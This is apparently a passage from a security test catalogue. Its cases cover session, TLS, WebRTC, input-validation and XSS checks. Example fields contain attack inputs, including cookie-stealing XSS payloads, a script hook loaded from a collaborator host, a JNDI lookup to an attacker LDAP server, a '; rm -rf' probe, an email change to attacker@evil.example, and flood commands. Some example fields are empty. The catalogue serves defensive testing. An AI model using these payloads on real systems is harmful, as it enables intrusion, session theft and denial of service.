Look at the Referer header sent to other sites.
tests.ex: curl -i 'https://target/account?JSESSIONID=<valid-id>' ; curl -i 'https://target/login?user=t&password=t'
tests.exp: Session IDs travel only in cookies over HTTPS. The application ignores IDs from URLs and does not accept POST data in GET.

tests.title: Check session cookie exposure to network attackers and HSTS
tests.obj: Finds session cookies that leak in clear text, also to subdomains.
steps: Log in as the victim. Remove the cookies that have Secure from the jar.
Send the secure function again with the remaining cookies.
Check Strict-Transport-Security with includeSubDomains.
Check if a subdomain can read cookies with a Domain attribute.
tests.ex: curl -sI https://target | grep -i strict-transport ; mitmproxy listen on :80 and redirect victim browser to http://sub.target
tests.exp: Session cookies are not sent over HTTP. HSTS covers the apex domain and all subdomains.

tests.title: Check cache headers on responses with session data
tests.obj: Finds responses with session IDs that proxies or the browser may store.
steps: Collect responses that set or carry session IDs.
Look at the Cache-Control header.
Look for the same headers in HTTP/1.0 clients.
Check that Clear-Site-Data is sent at logout.
tests.ex: curl -sI -b 'session=<id>' https://target/account | grep -i 'cache-control\|pragma\|clear-site-data'
tests.exp: Responses with session data have Cache-Control: no-store. Logout can clear stored data.

tests.title: Test session puzzling and session variable overload
tests.obj: Finds session variables used for more than one purpose, which skips steps in a flow.
steps: Map the session variables set by public pages such as password recovery.
Call a recovery entry point that sets a user name in the session.
Request a protected page directly.
Skip steps of multi-step flows.
tests.ex: Burp: GET /forgot?user=admin (do not finish), then GET /admin/dashboard with the same cookie.
tests.exp: Each session variable has one purpose. Pages cannot be reached by setting variables in another flow.

tests.title: Check the logout button on all pages
tests.obj: Finds pages without a visible logout function.
steps: Open every authenticated page type.
Look for the logout button without scrolling.
Check that it is in the same place on all pages.
tests.ex: Crawl with ZAP spider and compare each page for a /logout link: grep -L logout *.html
tests.exp: A logout function is visible and easy to find on all authenticated pages.

tests.title: Check server-side session termination at logout
tests.obj: Finds sessions that stay valid after logout.
steps: Save the session cookie. Log out.
Send a request with the old cookie to a protected page.
Use the Back button and look for private data.
For self-contained tokens, send the old token after logout.
tests.ex: curl -i -b 'session=<old>' https://target/account after GET /logout.
tests.exp: After logout the session is ended on the server. Old reference tokens and self-contained tokens are rejected.

tests.title: Check single sign-off and reuse of the auth cookie across devices
tests.obj: Finds SSO setups where logout does not end all sessions or one stolen value works anywhere.
steps: Log in on device 1 with MFA. Save all auth values.
Remove each value in turn and find the one that keeps the session alive.
Insert that value on device 2.
Log out on device 1. Use the value on device 2 and on other SSO apps.
tests.ex: Browser DevTools: copy auth-cookie from device 1, paste on device 2, then call GET /api/me on each SSO app.
tests.exp: Logout ends the session on all apps. The auth value works only for the device and cannot be copied to skip MFA.

tests.title: Test the idle timeout
tests.obj: Finds missing or client-only idle timeouts.
steps: Log in and note the time.
Send requests with longer waits: 5, 15 and 30 minutes.
Find the time when the server rejects the session.
Change client-side timestamps and cookie expiry values.
Replay the old session ID after the timeout.
tests.ex: while sleep 300; do curl -s -o /dev/null -w '%{http_code}\n' -b 'session=<id>' https://target/account; done
tests.exp: The server ends the session after the documented inactivity time and rejects the old ID. Client values do not extend it.

tests.title: Test the absolute session lifetime
tests.obj: Finds sessions that live forever when the user stays active.
steps: Log in and note the time.
Send a request every minute for the test window.
Check that the application asks for login at the documented limit.
Replay the old session ID.
tests.ex: while sleep 60; do curl -s -o /dev/null -w '%{http_code} ' -b 'session=<id>' https://target/account; done
tests.exp: The session ends at the absolute limit even with activity. Renewing the ID does not reset the limit.

tests.title: Check that disabling an account ends its sessions
tests.obj: Finds active sessions that survive when an account is disabled or deleted.
steps: Log in as a test user and keep the session cookie.
As administrator, disable the user, then delete another test user the same way.
Send requests with the saved cookies.
Test API tokens and refresh tokens too.
tests.ex: curl -i -b 'session=<user>' https://target/api/me after PATCH /admin/users/42 {"active":false}
tests.exp: All sessions and tokens of a disabled or deleted account stop working at once.

tests.title: Check the option to end other sessions after a factor change
tests.obj: Finds password or MFA changes that leave other sessions open.
steps: Log in on two browsers.
Change the password or MFA setting on browser 1.
Look for an option to end other sessions.
Test the session of browser 2.
tests.ex: Browser 2: curl -b 'session=<old>' https://target/account after the change in browser 1.
tests.exp: After a change of any authentication factor the user can end all other sessions. Reset and recovery do the same.

tests.title: Check that administrators can end user sessions
tests.obj: Finds missing admin control to end sessions of one or all users.
steps: Log in as administrator.
End the sessions of one user. Test that user's cookie.
End all sessions. Test several cookies.
Check that a normal user cannot call these functions.
tests.ex: curl -X POST https://target/admin/sessions/revoke -b 'session=<admin>' -d 'user=42'
tests.exp: Administrators can end the sessions of one user or all users, and the effect is immediate. Other roles cannot.

tests.title: Check that users can see and end their active sessions
tests.obj: Finds no session list, or ending sessions without re-authentication.
steps: Log in on two browsers.
Open the active session list.
End one session and check it stops.
Check that the action asks for a factor again.
tests.ex: GET /account/sessions then DELETE /account/sessions/<id> with and without a fresh login.
tests.exp: Users can see all active sessions and end any of them after they authenticate again with at least one factor.

tests.title: Check re-authentication before changes to account recovery data
tests.obj: Finds changes of email, phone or MFA that need only the session cookie.
steps: Log in. Change the email address.
Check if the password or MFA is asked.
Repeat for phone number, MFA settings and recovery data.
Send the change request from a stolen cookie in another browser.
tests.ex: curl -i -b 'session=<stolen>' -d 'email=attacker@evil.example' https://target/account/email
tests.exp: Changes to email, phone, MFA and recovery data need full re-authentication. Notices go to the old address.

tests.title: Check step-up authentication for highly sensitive operations
tests.obj: Finds high-value operations that need no extra proof.
steps: List the most sensitive actions: payments, admin changes, key export.
Run each action with a normal session.
Check for a second factor or secondary check.
Replay the confirmed request: it must not work a second time.
tests.ex: Burp Repeater: replay POST /transfer confirm=<otp> twice and change the amount between steps.
tests.exp: Highly sensitive actions need a second check each time. The approval is bound to the shown data and works once.

tests.title: Check that a session needs user consent or action
tests.obj: Finds sessions that start with no user action.
steps: Open a link to the application while the IdP session is active.
Check if the application creates a session without a click.
Open the application from a cross-site link and look at the result.
tests.ex: Open https://target/sso/start in a fresh tab from a cross-site page and watch for Set-Cookie without a click.
tests.exp: Sessions start only after a user action or consent. No silent session creation exists.

tests.title: Test concurrent sessions and session limits
tests.obj: Finds unlimited parallel sessions or old sessions that stay valid.
steps: Log in 100 times with one account and save each cookie.
Test the first cookie.
Log in from different IP addresses and places.
Compare the result with the documented limit.
tests.ex: for i in $(seq 100); do curl -s -c j$i.txt -d 'u=t&p=t' https://target/login -o /dev/null; done; curl -b j1.txt https://target/account -i
tests.exp: The application limits active sessions as documented and ends older sessions at the limit. Unusual logins cause a notice.

tests.title: Check where the client stores session tokens
tests.obj: Finds tokens in localStorage or sessionStorage, which scripts can read.
steps: Log in and open DevTools > Application.
Look in localStorage, sessionStorage and IndexedDB for tokens.
Check for tokens in the page source.
Check if XSS could read them.
tests.ex: DevTools console: Object.entries(localStorage).concat(Object.entries(sessionStorage))
tests.exp: Session tokens are not stored in localStorage or sessionStorage. They are in cookies with HttpOnly.

tests.title: Test state-changing requests for cross-site request forgery
tests.obj: Finds actions that a third-party page can trigger with the victim session cookie.
pre: Test environment.
steps: List the state-changing requests that rely only on cookies.
Check the SameSite attribute of the session cookie.
Replay a request without the anti-CSRF token and with a token of another user.
Build a test page that sends the request from another site, in a test environment.
Test JSON endpoints with a form content type.
tests.ex: ZAP: Generate Anti-CSRF Test Form on the request, host it on a second origin and open it in the victim session.
tests.exp: State-changing requests fail without a valid anti-CSRF token. The request origin and cookie attributes add defense.

tests.title: Make sure only TLS 1.2 and TLS 1.3 are enabled
tests.obj: Find old protocol versions (SSLv3, TLS 1.0, TLS 1.1) or weak settings such as compression.
steps: Scan the HTTPS port with testssl.sh or sslscan.
Make sure SSLv2, SSLv3, TLS 1.0 and TLS 1.1 are off.
Make sure TLS 1.3 is available and preferred.
Make sure TLS compression is off.
Repeat on every other TLS port that the application uses.
tests.ex: testssl.sh --protocols --vulnerable example.com:443; nmap --script ssl-enum-ciphers -p443 example.com
tests.exp: Only TLS 1.2 and TLS 1.3 are enabled, with the latest version preferred. Compression is off and no known TLS attack applies.

tests.title: Make sure only strong cipher suites with forward secrecy are enabled
tests.obj: Find weak cipher suites, such as NULL, anonymous, EXPORT, RSA key transport and CBC, and weak key exchange groups.
steps: List all cipher suites that the server accepts for each protocol version.
Make sure NULL, anonymous, EXPORT and RC4 and 3DES suites are off.
Make sure TLS 1.2 uses ECDHE with AEAD suites and the server order puts the strongest first.
Make sure RSA key transport and static DH suites are off. They have no forward secrecy.
Check the Diffie-Hellman groups and look for ffdhe2048 or larger, x25519 or secp256r1.
tests.ex: testssl.sh -E example.com:443; sslyze --regular example.com; Mozilla SSL config generator https://ssl-config.mozilla.org/
tests.exp: Only AEAD cipher suites with forward secrecy are accepted, strongest first. No NULL, anonymous, EXPORT or RSA key transport suite exists.

tests.title: Make sure external services use valid, publicly trusted TLS certificates
tests.obj: Find expired, self-signed, wrong-host or chain-broken certificates on public services.
steps: Get the certificate chain of each public host with openssl s_client or testssl.sh.
Make sure the validity dates are current and the chain ends at a public CA.
Make sure the Subject Alternative Name matches the host name.
Make sure the certificate uses a SHA-256 or stronger signature and a strong key.
Look for internal names or IP addresses in the Issuer and SAN fields.
tests.ex: echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -text | grep -E 'Not After|Subject Alternative|Signature Algorithm|Public-Key'; testssl.sh -S example.com
tests.exp: All public services present valid certificates from a public CA, with matching SAN, SHA-256 or stronger signature, and no internal data.

tests.title: Review certificate key strength, wildcard use and key protection
tests.obj: Find weak certificate keys, wide wildcard certificates and unprotected private keys.
steps: Read the key type and size of each certificate.
Make sure RSA keys are 3072 bits or more, or ECDSA uses P-256 or better.
List the systems that share each wildcard certificate and check their trust levels.
Check the file permissions and storage of the private key.
Check certificate lifetime and automatic renewal, for example with ACME.
tests.ex: testssl.sh -S example.com; ls -l /etc/ssl/private/; nmap --script ssl-cert -p443 example.com
tests.exp: Keys are strong and protected. Wildcard certificates are not shared between systems of different trust levels.

tests.title: Make sure all connections use TLS with no clear-text fallback
tests.obj: Find cleartext HTTP, FTP or other services, and clients that fall back to clear text.
steps: Try each application host on port 80 and other plain ports with curl.
Look at the page source and traffic for http:// resources and mixed content.
Try a downgrade: strip the TLS upgrade and request the HTTP URL of login and API paths.
Make sure no sensitive request is accepted on HTTP, and cookies have the Secure flag.
Check Basic authentication, login forms, password reset, change pages and payment pages.
tests.ex: curl -si http://example.com/login; nmap -p 21,23,80,8080 example.com; mitmproxy --mode regular
tests.exp: The services accept sensitive data only over TLS. No cleartext fallback and no mixed active content exist.

tests.title: Make sure no channel sends sensitive data in clear text
tests.obj: Find credentials, session IDs and personal data that travel unencrypted or are stored in source and logs.
steps: Capture traffic during login, password reset, profile edit and payment.
Look for sensitive data in clear text in non-HTTP channels such as e-mail, FTP and SMTP.
Search the source and log files for hard-coded passwords and personal data.
Make sure the Secure flag is set on session cookies.
tests.ex: tcpdump -i eth0 -A port 80 | grep -iE 'password|session'; grep -rEi 'password|pwd|secret' ./src
tests.exp: The application sends sensitive data only over encrypted channels. No clear-text secrets exist in source or logs.

tests.title: Check Online Certificate Status Protocol stapling and revocation
tests.obj: Find servers that do not support certificate revocation checks.
steps: Run openssl s_client with -status against the host.
Look for an OCSP response in the output.
Check that the certificate has OCSP or CRL information.
Check that the server renews the staple.
tests.ex: echo | openssl s_client -connect example.com:443 -status 2>/dev/null | grep -A5 'OCSP Response'; testssl.sh -S example.com
tests.exp: The server staples a current OCSP response, or another revocation method is documented.

tests.title: Check that Encrypted Client Hello is enabled
tests.obj: Find TLS settings that expose the server name in clear text.
steps: Query the DNS HTTPS record for an ech parameter.
Test a TLS connection with an ECH-capable client.
Check the server and CDN settings for ECH.
tests.ex: dig +short HTTPS example.com; curl --ech true https://example.com/ -v
tests.exp: ECH is enabled, or the owner has accepted the risk in writing.

tests.title: Make sure mTLS client certificates are validated before use
tests.obj: Find servers that accept untrusted or unchecked client certificates for identity.
steps: Connect with no certificate and with a self-signed certificate.
Connect with an expired certificate and a certificate from another CA.
Connect with a revoked certificate if a test one exists.
Check that the identity is taken only after chain validation.
tests.ex: openssl s_client -connect example.com:443 -cert selfsigned.pem -key selfsigned.key; curl --cert client.pem --key client.key https://example.com/
tests.exp: The server rejects client certificates that are untrusted, expired, revoked or from another CA.

tests.title: Make sure the application validates server certificates on outbound TLS
tests.obj: Find backend clients that disable certificate validation or use clear text to monitoring, databases and partners.
steps: List all outbound connections: databases, queues, partner APIs, monitoring, SSH and management tools.
Search the code for switches that turn off certificate checks, such as InsecureSkipVerify and TrustAllCerts.
Put a proxy with a self-signed certificate in front of one outbound call.
Look at whether the call fails and the failure is logged.
Make sure no outbound connection falls back to clear text.
tests.ex: grep -rEn 'verify\s*=\s*False|InsecureSkipVerify|rejectUnauthorized:\s*false|TrustAll' ./src; mitmproxy --mode reverse:https://partner.example
tests.exp: All outbound connections use TLS and reject invalid certificates. The failure is logged and there is no fallback to clear text.

tests.title: Check TLS, trust and authentication between internal services
tests.obj: Find internal HTTP services that use clear text, untrusted certificates or no service authentication.
steps: Map internal HTTP service calls in the architecture documents.
Capture traffic between two internal services and look for clear text.
Check which CA each service trusts. Self-signed use must be pinned to specific CAs.
Call an internal service from another host without a client certificate.
tests.ex: tcpdump -i any -A 'port 8080 and host 10.0.0.5'; openssl s_client -connect svc.internal:8443 -showcerts
tests.exp: Internal service traffic uses TLS with trusted certificates. Services use strong mutual authentication.

tests.title: Test LaTeX processing for command injection
tests.obj: Finds LaTeX rendering features that run with shell escape enabled or accept unrestricted commands.
pre: Do not run on production.
steps: Find a feature that renders user-supplied LaTeX, such as a math editor or document export.
Submit a LaTeX command that would call the shell if shell-escape is enabled.
Submit a command outside the documented allowlist and confirm it is rejected.
tests.ex: \write18{id} payload, which only runs if pdflatex is called with --shell-escape
tests.exp: LaTeX is rendered without the shell-escape flag and only an allowlist of safe commands is permitted.

tests.title: Test potentially dangerous input sinks for length and character limits
tests.obj: Finds sinks that accept oversized or unrestricted character input before passing it to a risky context.
pre: Do not run on production.
steps: Identify a sink that forwards input to a risky context, such as a shell, template or report engine.
Submit an input far longer than the field appears to allow.
Submit input containing characters outside the expected character class for that field.
tests.ex: Submit a 100000-character string, and a field expecting digits with input such as '<script>' or '; rm -rf'
tests.exp: The sink enforces an explicit length limit and an allowlist of safe characters before use.

tests.title: Test JNDI lookup parameters for JNDI injection
tests.obj: Finds application code that builds a JNDI name or lookup from untrusted input.
pre: Do not run on production.
steps: Find inputs that influence a JNDI lookup name, such as a datasource or LDAP resource identifier.
Submit a JNDI URI pointing to an attacker-controlled LDAP or RMI server.
Confirm whether the application attempts to connect to the attacker server from the lookup.
tests.ex: Submit ldap://collaborator-host/a as the JNDI lookup name and watch for an outbound connection
tests.exp: JNDI lookups are restricted to a fixed, trusted set of names and remote codebases are disabled.

tests.title: Test memcache key and value input for injection
tests.obj: Finds data sent to a memcache server that is not sanitized against protocol injection.
pre: Do not run on production.
steps: Find inputs that are stored in or used as a key for a memcache lookup.
Submit memcache protocol control characters, such as a carriage return and line feed, in the input.
Observe whether the memcache protocol is disrupted or a second command is injected.
tests.ex: Memcache key probe containing \r\n followed by a second protocol command
tests.exp: Input sent to memcache is sanitized of protocol control characters before being used as a key or value.

tests.title: Test memory-unsafe native components for overflow conditions
tests.obj: Finds native code components that lack memory-safe string and pointer handling.
pre: Do not run on production.
steps: Identify any native, C or C++ component that processes untrusted input, such as an image or document parser.
Submit oversized and boundary-length input to the native component.
Review build flags and source for memory-safe string functions and bounds checks.
tests.ex: Fuzz the native parser with AFL or a long crafted file and monitor for a crash or ASAN report
tests.exp: Native components use memory-safe string and pointer functions and reject input causing an overflow.

tests.title: Test numeric input handling for integer overflow
tests.obj: Finds numeric fields that wrap or overflow instead of rejecting out-of-range values.
pre: Do not run on production.
steps: Find numeric input fields that affect business logic, such as quantity or amount.
Submit a value at the boundary of the integer type, such as 2147483647 plus one.
Submit a negative value where only positive values should be allowed.
Observe whether the stored or displayed result wraps to an unexpected value.
tests.exp: Numeric input is range- and sign-checked server-side and rejected before it can overflow or wrap.

tests.title: Test resource cleanup for use-after-free and dangling references
tests.obj: Finds native components that fail to null out freed pointers, risking use-after-free exploitation.
pre: Do not run on production.
steps: Identify a native component that allocates and frees memory for each request.
Send concurrent or malformed requests designed to trigger an early free followed by reuse.
Monitor for a crash or memory corruption using a sanitizer build.
tests.ex: Run the native component under AddressSanitizer while sending malformed and concurrent requests
tests.exp: Freed memory and pointers are set to null or removed immediately, and no use-after-free is observed under a sanitizer.

tests.title: Test multiple parsers for consistent interpretation of the same input
tests.obj: Finds mismatched JSON, XML or URL parsing between components that attackers can exploit.
pre: Do not run on production.
steps: Identify where the same raw input, such as a URL or JSON document, is parsed by more than one component.
Submit an input with an ambiguous encoding, such as a duplicate key or an unusual Unicode form.
Compare how each parser interprets the value and look for a disagreement that bypasses a security check.
tests.ex: Duplicate JSON key {"user":"admin","user":"guest"} parsed differently by the front-end proxy and the backend; URL with %2e%2e%2f parsed differently by two components
tests.exp: All components that parse the same data use the same library, configuration and character encoding so interpretation never diverges.

tests.title: Review input validation documentation for defined data formats
tests.obj: Confirms the application documents expected data formats for structured input fields.
steps: Request the application design or API documentation.
Check whether input validation rules are documented for common data formats such as email, phone or credit card.
Check whether an internal data format used by the application is documented with its validation rule.
tests.ex: Review API specification or developer wiki for a documented validation rule per field
tests.exp: Documentation defines the validation rule for every structured input field, including common and internal formats.

tests.title: Review documentation for cross-field logical consistency rules
tests.obj: Confirms the application documents how related fields must be consistent with each other.
steps: Request the application design documentation for fields that must be logically related, such as suburb and postal code.
Check whether the documentation defines the expected relationship and the validation rule applied.
tests.ex: Review documentation for a rule such as "postal code must match the selected suburb"
tests.exp: Documentation defines the logical and contextual consistency rule for every related group of input fields.

tests.title: Review documentation for business logic limits
tests.obj: Confirms per-user and global business logic limits are documented before they are tested.
steps: Request the application design documentation for business logic limits, such as maximum order size or rate limits.
Check whether both per-user and global limits are defined for each relevant function.
tests.ex: Review documentation for a stated per-user and global limit on a function, such as daily transfer amount
tests.exp: Documentation defines both per-user and global business logic limits for every relevant function.

tests.title: Test business-critical input against positive allowlist validation
tests.obj: Finds business- or security-decision input validated only by a blocklist instead of a positive allowlist.
pre: Do not run on production.
steps: Identify an input used to make a business or security decision, such as a discount code or role selection.
Submit a value outside the documented allowlist of values, patterns or ranges.
Submit a value that a blocklist filter was not designed to catch, such as an unexpected encoding.
tests.ex: role=superadmin where only user and manager are valid roles; discount=%00OVERRIDE
tests.exp: The input is checked with positive allowlist validation against documented values, patterns or ranges, not a blocklist.

tests.title: Test that client-side validation is enforced again server-side
tests.obj: Finds input validation that exists only in client-side JavaScript and can be bypassed with a direct request.
pre: Do not run on production.
steps: Identify a field with client-side validation, such as a maximum length or regex pattern.
Disable JavaScript or use a proxy to submit a request that violates the client-side rule directly to the server.
Observe whether the server accepts the value that the client would have rejected.
tests.ex: Burp Repeater: resend the request with an out-of-range or malformed value, bypassing the browser form entirely
tests.exp: The server enforces the same validation rule independently of the client, rejecting the bypassed value.

tests.title: Test related input fields for combined-value consistency
tests.obj: Finds endpoints that accept individually valid fields whose combination is logically inconsistent.
pre: Do not run on production.
steps: Identify fields whose combination must be logically consistent, such as a start date and an end date.
Submit a combination that is individually valid for each field but inconsistent together.
Observe whether the application accepts or rejects the inconsistent combination.
tests.ex: start_date=2026-05-01&end_date=2026-01-01 ; discount=50&subtotal=10 making the discount exceed the subtotal
tests.exp: The server validates that combinations of related fields are logically consistent and rejects the inconsistent request.

tests.title: Find WebAssembly modules, debug artifacts and embedded endpoints
tests.obj: Find Wasm modules, source maps, DWARF data and embedded URLs or secrets that leak implementation details.
steps: Open the Network tab, use the Wasm filter, and reload the application.
Search the JavaScript for WebAssembly.instantiate, compile and new WebAssembly.Module.
Look for embedded modules: long Base64 strings, data: URIs and files with other extensions.
Check files for the magic bytes 00 61 73 6d.
List imports, exports, custom sections (name, DWARF) and source map links.
Extract strings for URLs, API endpoints and keys.
tests.ex: wasm-objdump -x module.wasm | head -50; strings -n 8 module.wasm | grep -iE 'http|key|token'; od -An -tx1 -N8 module.bin; wasm-tools print module.wasm
tests.exp: No debug information, source maps or secrets are in production modules. The tester has a list of all modules.

tests.title: Make sure the TURN service blocks reserved and internal addresses
tests.obj: Find TURN relays that forward traffic to internal, loopback or broadcast addresses.
pre: Only use test credentials.
steps: Get TURN credentials from the application.
Ask the TURN server to relay to loopback, link-local, private and broadcast IPv4 and IPv6 addresses.
Look at whether the allocation or permission is refused.
Review the TURN configuration for denied peer address ranges.
tests.ex: turnutils_uclient -u user -w pass -p 3478 -e 127.0.0.1 turn.example.com; nmap -sU -p3478 --script stun-info turn.example.com
tests.exp: The TURN server refuses relay to reserved address ranges for IPv4 and IPv6.

tests.title: Make sure the TURN service resists resource exhaustion
tests.obj: Find TURN servers where one user can open very many ports and exhaust the server.
pre: Do not run flood tests on production.
steps: Open allocations with one account until the server refuses.
Check per-user quotas and total port limits in the configuration.
Check that normal users still get allocations during the test.
tests.ex: turnutils_uclient -u user -w pass -m 500 -n 1000 turn.example.com
tests.exp: Per-user allocation limits exist and normal users keep service.

tests.title: Make sure the DTLS certificate key is managed by the key policy
tests.obj: Find DTLS keys that are unmanaged, shared or never rotated.
steps: Find the DTLS certificate and key of the media server.
Check where the key is stored and who can read it.
Compare handling and rotation with the key management policy.
tests.ex: openssl x509 -in dtls-cert.pem -noout -dates -fingerprint; ls -l /etc/media/dtls/
tests.exp: The DTLS key follows the documented key management policy, with protected storage and rotation.

tests.title: Check DTLS cipher suites and the SRTP protection profile
tests.obj: Find weak DTLS cipher suites or SRTP profiles at the media server.
steps: Start a call and capture the DTLS handshake.
Read the negotiated cipher suite and the DTLS-SRTP protection profile.
Try a handshake with weak suites and null profiles.
Compare with the approved list.
tests.ex: Wireshark filter 'dtls.handshake'; sslyze or openssl s_client -dtls1_2 -connect media.example.com:5004 -use_srtp SRTP_AES128_CM_SHA1_80
tests.exp: Only approved DTLS cipher suites and strong SRTP protection profiles are accepted.

tests.title: Make sure the media server checks SRTP authentication
tests.obj: Find media servers that accept injected RTP packets.
pre: Do not run flood tests on production.
steps: Join a call as a test client.
Send forged RTP and SRTP packets with a wrong auth tag into the stream.
Check whether the server drops them and the media stays clean.
tests.ex: scapy script that sends RTP to the media port; compare audio output
tests.exp: The server drops packets that fail SRTP authentication. No media is inserted and no denial of service occurs.

tests.title: Make sure the media server survives malformed SRTP packets
tests.obj: Find media servers that crash or stall on malformed SRTP packets.
pre: Do not run flood tests on production.
steps: Fuzz SRTP and RTP packets towards the media port with test tools.
Watch the server process, CPU and memory.
Check that other calls continue.
tests.ex: boofuzz SRTP template against media.example.com; monitor with top
tests.exp: The server ignores malformed packets and keeps processing legitimate media.

tests.title: Make sure the media server and recording survive SRTP floods
tests.obj: Find media servers and recording services that fail under floods from legitimate users.
pre: Do not run flood tests on production.
steps: Create a flood of valid SRTP traffic from many test clients.
Check that existing calls and the recording process keep working.
Check limits per client.
tests.ex: WebRTC load test tool that opens 200 test clients
tests.exp: Media processing and recording continue during floods from legitimate users.

tests.title: Check the media server for the DTLS ClientHello race condition
tests.obj: Find media servers that are vulnerable to the DTLS ClientHello race condition.
pre: Do not run flood tests on production.
steps: Find the media server product and version.
Check vendor advisories for the DTLS ClientHello race condition.
If no advisory clears it, run the race test with two parallel ClientHello messages in a test system.
tests.ex: Review the CVE list for the media stack; custom script that sends two ClientHello messages in parallel
tests.exp: The server is patched for the known issue or the race test shows no failure.

tests.title: Make sure the DTLS certificate matches the SDP fingerprint
tests.obj: Find clients and servers that accept DTLS certificates that do not match the SDP fingerprint.
steps: Intercept the signaling and change the a=fingerprint line in the SDP.
Start the call.
Check that the media stream ends.
tests.ex: Intercept the SDP in the signaling WebSocket with Burp and change the a=fingerprint value
tests.exp: The media stream ends when the DTLS certificate does not match the SDP fingerprint.

tests.title: Check signaling server rate limits against floods
tests.obj: Find signaling servers that fail during message floods.
pre: Do not run flood tests on production.
steps: Send a flood of signaling messages from one test client.
Check that the server limits the client and keeps serving others.
Check the rate limit setting at the signaling level.
tests.ex: wscat loop or k6 websocket script sending 10000 messages per second to wss://example.com/signal
tests.exp: Signaling rate limits stop the flood, and legitimate messages continue.

tests.title: Make sure the signaling server handles malformed messages safely
tests.obj: Find signaling servers that crash on malformed messages, integer overflows or large fields.
pre: Do not run flood tests on production.
steps: Send malformed JSON or SDP, very long fields, and extreme numbers to the signaling endpoint.
Watch the server process and logs.
Check that other sessions are not affected.
tests.ex: boofuzz or a custom fuzzer for the signaling protocol; Burp WebSocket Repeater with oversized fields
tests.exp: The server rejects malformed messages with input validation. It does not crash or stall.

tests.title: Test reflected input for cross-site scripting
tests.obj: Finds input that is echoed back in the response without context-aware encoding.
pre: Do not run on production.
steps: List every input that is reflected in the HTML response, including headers and hidden fields.
Submit a basic script payload in each input and view the rendered page source.
If the basic payload is blocked, try case variation, broken tags and non-recursive filter bypass payloads.
Confirm execution with a popup or a network call to a collector host.
tests.ex: <script>alert(123)</script> ; "><script>alert(document.cookie)</script> ; <ScRiPt>alert(1)</ScRiPt> ; <scr<script>ipt>alert(1)</script>
tests.exp: The response HTML-encodes or JavaScript-escapes the reflected value for its context, so no script executes.

tests.title: Test stored input fields for persistent cross-site scripting
tests.obj: Finds user content that is stored and later rendered without encoding to other users.
pre: Do not run on production.
steps: Identify fields that persist to a data store, such as a profile, comment or support ticket.
Submit a script payload in the field and save it.
Reload the page as the same user and as another user, including a higher-privilege user.
If the payload is uploaded as a file, upload an HTML or SVG file and request it directly.
tests.ex: aaa@aa.com"><script>alert(document.cookie)</script> ; stored hook: "><script src=https://collaborator-host/hook.js></script>
tests.exp: Stored content is HTML-encoded on output for every viewer, and uploaded HTML or SVG files do not execute as script.

tests.title: Test HTML sanitization of rich text and WYSIWYG input
tests.obj: Finds HTML sanitizers that fail to strip dangerous tags, attributes or SVG script content.
pre: Do not run on production.
steps: Find a feature that accepts rich HTML input, such as a WYSIWYG editor or markdown renderer.
Submit script tags, event handler attributes and an SVG element with embedded script.
Submit CSS, Markdown or template syntax that the renderer may evaluate as an expression.
Compare the stored output against the sanitizer allowlist and confirm it rejects dangerous content.
tests.ex: ; ; Markdown/CSS/XSL expression payloads
tests.exp: The sanitizer strips scripts, event handlers and dangerous SVG elements, keeping only an explicit allowlist of tags and attributes.

tests.title: Test URL, JavaScript and CSS output contexts for correct encoding
tests.obj: Finds output encoding that is missing or wrong for the URL, JavaScript, CSS or HTTP header context.
pre: Do not run on production.
steps: Find a value placed into a URL attribute, a JavaScript variable, a CSS value and an HTTP header.
Submit a context-breaking payload for each context, for example a quote for JavaScript or a URL scheme.
Check if the javascript: or data: scheme is accepted in a URL attribute.
Confirm each context applies the matching encoder before use.
tests.ex: URL context: javascript:alert(1) in href ; JS context: ';alert(1);' ; CSS context: expression(alert(1)) or url(javascript:alert(1))
tests.exp: Each context uses its matching encoder, and javascript: and data: schemes are rejected for navigable URLs.

tests.title: Test regular expressions and dynamic code features for injection and ReDoS
tests.obj: Finds unescaped use of regular expression metacharacters and catastrophic backtracking patterns.
pre: Do not run on production.
steps: Find inputs used to build a regular expression or passed to eval or a template expression language.
Submit regex metacharacters to confirm they are escaped before being used.
Submit a pattern crafted for exponential backtracking and measure response time.
Confirm the application does not call eval or Spring Expression Language on the input.
tests.ex: Regex metachar probe: .*+ ; ReDoS payload: (a+)+$  followed by 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' ; eval probe: 7*7
tests.exp: Regex metacharacters in user input are escaped, vulnerable patterns are avoided, and eval is never called on user input.

tests.title: Test DOM sinks for DOM-based cross-site scripting
tests.obj: Finds client-side JavaScript that writes an untrusted source into a dangerous DOM sink.
pre: Do not run on production.
steps: Review client-side JavaScript for sources such as location.hash, location.search and document.referrer.
Trace each source to its sink, for example innerHTML, document.write or eval.
Craft a payload in the URL fragment or query string that reaches the sink.
Load the crafted URL and confirm script execution in the browser.
tests.ex: https://target/page# ; https://target/?user=
tests.exp: Untrusted sources are written only through safe sinks such as textContent, or are sanitized before reaching innerHTML or eval-like sinks.

tests.title: Test self-triggered DOM XSS requiring a pasted payload
tests.obj: Finds client-side sinks that execute attacker content only after the victim pastes it into the page.
pre: Do not run on production.
steps: Find client-side functions that strip HTML tags using innerHTML and then read textContent.
Craft an HTML payload designed to survive the strip step, such as an img tag with an onerror handler.
Paste the payload into the field in the browser and submit it.
Check the developer console for the payload executing.
tests.ex: pasted into a textarea whose submit handler reads innerHTML then textContent
tests.exp: The page never relies on a user pasting raw markup into a sink that can re-parse it as HTML.

tests.title: Test JavaScript injection sinks outside script tags
tests.obj: Finds JavaScript execution sinks reachable without a literal script tag, such as eval or location assignment.
pre: Do not run on production.
steps: Review the page for sinks such as eval, setTimeout, setInterval and window.location assignment that use untrusted data.
Submit a javascript: scheme payload where the sink assigns a user-controlled value to a navigation property.
Confirm execution in the browser developer console.
tests.ex: www.target.com/?javascript:alert(1) read by window.location=decodeURIComponent(location.search.substring(1))
tests.exp: User-controlled values never reach eval, setTimeout, setInterval or a navigation sink without validation.

tests.title: Test client-side HTML injection sinks
tests.obj: Finds client-side code that writes untrusted data into innerHTML or document.write.
pre: Do not run on production.
steps: Find client-side code that writes a URL fragment, query parameter or API response into innerHTML or document.write.
Submit an image tag with an onerror handler in the relevant input.
Confirm the payload executes in the rendered page.
tests.ex: https://target/page.html?user=<img%20src='x'%20onerror=alert(1)>
tests.exp: Untrusted data is written only through safe text sinks, or is sanitized with a vetted library before reaching innerHTML.

tests.title: Test CSS injection and CSS-based data exfiltration
tests.obj: Finds unsanitized CSS values that enable style injection or attribute-selector data theft.
pre: Do not run on production.
steps: Find a sink that assigns untrusted data to a style property or cssText.
